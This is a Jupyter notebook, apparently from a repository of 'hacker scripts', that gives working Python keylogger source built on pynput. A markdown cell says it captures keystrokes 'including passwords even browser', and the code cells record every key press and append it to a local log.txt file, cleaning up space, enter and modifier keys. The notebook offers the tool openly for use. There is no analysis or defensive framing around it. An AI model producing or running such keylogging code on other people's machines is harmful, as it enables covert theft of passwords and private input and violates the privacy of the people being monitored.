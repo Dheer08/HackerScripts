{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h1>Key Logger</h1>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<img src = \"logger.png\">"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <b><i>Key Logger stores the keystrokes into a file including passwords even browser<b><i>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "#importing Library\n",
    "from pynput.keyboard import Listener"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Writing the KeyStrokes in file\n",
    "def writeoffile(key):\n",
    "    key_data =str(key)\n",
    "    key_data =key_data.replace(\"'\",\"\")\n",
    "    #Cleaning the final file \n",
    "    if key_data == 'Key.space':\n",
    "        key_data = ' '\n",
    "    if key_data == 'Key.shift_r':\n",
    "        key_data = ''\n",
    "    if key_data == \"Key.ctrl_l\":\n",
    "        key_data = \"\"\n",
    "    if key_data == \"Key.enter\":\n",
    "        key_data = \"\\n\"\n",
    "    if key_data == \"Key.backspace\":\n",
    "        pass\n",
    "        \n",
    "    with open('log.txt','a') as f:\n",
    "        f.write(key_data)        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Listening To Keystrokes\n",
    "with Listener(on_press = writeoffile) as l:\n",
    "    l.join()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
